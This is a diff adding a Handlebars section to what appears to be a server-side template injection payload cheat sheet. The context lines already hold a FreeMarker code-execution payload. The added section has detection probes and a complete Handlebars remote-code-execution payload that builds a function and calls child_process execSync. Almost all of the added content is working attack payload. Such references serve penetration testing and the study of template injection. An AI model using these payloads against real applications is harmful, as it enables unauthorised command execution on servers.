@@ -56,3 +56,40 @@ Basic:
 // Code Execution — id:
 ${"freemarker.template.utility.Execute"?new()("id")}
 ```
+
+## JavaScript
+
+### Handlebars
+
+Link: [https://handlebarsjs.com/](https://handlebarsjs.com/)
+
+Basic:
+
+```javascript
+${{7*7}} -> OK
+${{7*'7'}} -> Empty
+```
+
+RCE (from [payload all the thing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#handlebars)):
+
+```javascript
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('ls -la');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
